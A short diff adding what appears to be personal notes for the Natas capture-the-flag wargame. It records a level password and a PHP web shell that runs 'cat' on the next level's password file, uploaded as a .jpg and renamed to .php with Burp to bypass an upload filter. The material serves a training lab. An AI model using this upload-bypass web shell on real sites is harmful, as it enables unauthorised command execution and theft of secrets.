@@ -1,0 +1,9 @@
+natas12:YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG
+
+create a jpg file containing:
+<?php
+echo system("cat /etc/natas_webpass/natas13");
+?>
+
+the you upload it and intercept with burp the request
+and change the extention from .jpg to .php
